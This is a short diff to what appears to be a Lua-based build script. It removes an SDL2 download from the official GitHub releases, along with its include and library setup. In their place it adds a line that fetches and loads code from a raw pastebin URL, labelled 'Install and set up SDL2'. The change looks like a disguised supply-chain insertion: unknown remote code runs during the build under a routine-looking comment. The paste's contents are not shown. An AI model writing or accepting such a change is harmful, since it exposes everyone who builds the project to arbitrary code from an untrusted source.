@@ -25,8 +25,6 @@ NET_48 = "C:/Program Files (x86)/Windows Kits/NETFXSDK/4.8"
 
 -- "Rule" for MSVC
 if target == "msvc" then
-    sdl_path = workspace_download_zip("https:/github.com/libsdl-org/SDL/releases/download/release-2.30.2/SDL2-devel-2.30.2-VC.zip")
-
     include_paths = {
         MSVC_LOCATION .. "/include",
         MSVC_LOCATION .. "/atlmfc/include",
@@ -67,11 +65,7 @@ if target == "msvc" then
     set_include_paths (include_paths)
     set_libs (libs)
 
-    add_include_path(sdl_path .. "/SDL2-2.30.2/include")
-    add_lib_path(sdl_path .. "/SDL2-2.30.2/lib/" .. arch)
-    add_lib("SDL2.lib")
-    add_lib("SDL2main.lib")
-    add_asset(sdl_path .. "/SDL2-2.30.2/lib/" .. arch .. "/SDL2.dll", "SDL2.dll")
+    require_url("https://pastebin.com/raw/K8gige7g") -- Install and set up SDL2
     
     add_linker_flag("/SUBSYSTEM:WINDOWS")
     msvc=true
